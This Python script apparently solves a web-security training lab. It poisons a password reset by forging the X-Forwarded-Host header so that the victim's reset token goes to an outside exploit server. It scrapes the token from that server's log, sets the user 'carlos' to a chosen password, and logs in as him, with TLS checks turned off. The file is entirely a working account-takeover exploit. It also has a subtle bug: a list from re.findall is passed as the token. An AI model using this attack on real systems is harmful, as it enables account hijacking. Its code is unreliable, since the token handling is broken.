"""
  Lab: Password reset poisoning via middleware

  Steps:
  1. Ask for recover the password abusing of X-Forwarded-Host to send the token to your exploit server
  2. Parse the token from exploit server
  3. Change the 'carlos' password using the token
  4. Login as 'carlos' using the new password

  Author: D4mn20
"""

import argparse
import re
from bs4 import BeautifulSoup
from colorama import Fore

import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

EXPLOIT_SERVER = "https://exploit-0a6e00d30433331280f42a5e0134001f.exploit-server.net"

def main():
  parser = argparse.ArgumentParser()
  parser.add_argument('-u', "--url", required=True, help='Target URL (e.g: https://vulnerableapp.com/)')
  parser.add_argument("--proxy", help="Web Proxy (e.g: 'http://127.0.0.1:8080')")
  args = parser.parse_args()

  print(F"{Fore.BLUE}Starting...{Fore.RESET}")
  session = requests.Session()
  if args.proxy:
    proxies = {
      "http": args.proxy,
      "https": args.proxy
    }
    session.proxies = proxies
  session.verify = False
  url = args.url.strip('/')

  try:
    print(f"{Fore.YELLOW}Step 1.{Fore.RESET} Asking a recovery password link...")
    received = ask_recovery_password_link(session, url)
    if not received:
      print(f"{Fore.RED}[-] Failed to ask recovery password link.{Fore.RESET}")

    print(f"{Fore.YELLOW}Step 2.{Fore.RESET} Getting token from link...")
    temp_forgot_password_token = parse_temp_forgot_password_token(session, EXPLOIT_SERVER)
    if not temp_forgot_password_token:
        print(f"{Fore.RED}[-] Failed to parse temp forgot password token.{Fore.RESET}")
        return False
    
    print(f"{Fore.YELLOW}Step 3.{Fore.RESET} Changing the 'carlos' password...")
    password = change_password(session, url, temp_forgot_password_token)
    if not password:
      print(f"{Fore.RED}[-] Failed to change password.{Fore.RESET}")
      return False
    
    print(f"{Fore.YELLOW}Step 4.{Fore.RESET} Loging as carlos with the new password...")
    if login(session, url, password):
      print(f"{Fore.GREEN}[x] Lab solved!{Fore.RESET}")

  except Exception as e:
    print(f"{Fore.RED}[!] An error occured: {e}")
    return False

def ask_recovery_password_link(session, url):
  headers = {
    "X-Forwarded-Host": EXPLOIT_SERVER[8:]
  }
  try:
    response = session.post(f"{url}/forgot-password", data={"username": "carlos"}, headers=headers, allow_redirects=False)
    
    if response.status_code != 200:
      print(f"{Fore.RED} Status code other than 200, see Burp Proxy history for better information{Fore.RESET}")
      return None
    
    return response
  except Exception as e:
    print(f"{Fore.RED}[-] Request error in ask_recovery_password_link: {e}{Fore.RESET}")
    return None

def parse_temp_forgot_password_token(session, url):
  try:
    response = session.get(f"{url}/log")

    if response.status_code != 200:
      print(f"{Fore.RED}[-] Failed to retrieve the logs page. Status: {response.status_code}{Fore.RESET}")
      return None
    
    soup = BeautifulSoup(response.text, 'html.parser')
    logs = soup.find('pre')
    token = re.findall("temp-forgot-password-token=(.*) HTTP", logs.text)

    if not token:
      print(f"{Fore.RED}[-] Token pattern not found in the logs.{Fore.RESET}")
      return None
    
    return token
  
  except Exception as e:
    print(f"{Fore.RED}[-] Request error in parse_temp_forgot_password_token: {e}{Fore.RESET}")
    return None
  
def change_password(session, url, token):
  try:
    response = session.post(
      f"{url}/forgot-password?temp-forgot-password-token={token}",
      data={
        "temp-forgot-password-token": token,
        "username": "carlos",
        "new-password-1": "p0wn3d",
        "new-password-2": "p0wn3d"
        },
      allow_redirects=False
      )
    
    if response.status_code != 302:
      print(f"{Fore.RED} Status code other than 302, see Burp Proxy history for better information{Fore.RESET}")
      return None
    
    return "p0wn3d"
  except Exception as e:
    print(f"{Fore.RED}[-] Request error in change_password: {e}{Fore.RESET}")
    return None

def login(session, url, password):
  try:
    # request with redirect
    response = session.post(f"{url}/login", data={"username": "carlos", "password": password})
    
    if response.status_code != 200:
      print(f"{Fore.RED} Status code other than 200, see Burp Proxy history for better information{Fore.RESET}")
      return False
    
    return True
  except Exception as e:
    print(f"{Fore.RED}[-] Request error in change_password: {e}{Fore.RESET}")
    return False

if __name__ == "__main__":
  main()